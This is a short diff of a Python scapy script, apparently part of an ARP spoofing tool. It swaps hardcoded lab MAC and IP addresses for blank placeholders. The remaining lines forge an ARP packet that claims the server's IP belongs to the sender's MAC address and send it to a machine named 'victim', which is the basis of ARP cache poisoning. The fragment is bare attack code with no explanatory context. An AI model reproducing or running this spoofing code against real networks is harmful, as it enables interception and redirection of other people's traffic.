@@ -2,9 +2,9 @@
 
 from scapy.all import *
 
-myMAC = "08:00:27:c2:50:70"
-victim = "192.168.22.4"
-server = "192.168.22.200"
+myMAC = ""	#MAC
+victim = ""	#IP
+server = ""	#IP
 
 packet=Ether(src=myMAC ,dst="ff:ff:ff:ff:ff:ff")/ARP(hwlen=6,plen=4,op=1,hwsrc=myMAC,psrc=server,pdst=victim)
 answer = srp1(packet, timeout=1, verbose=False)
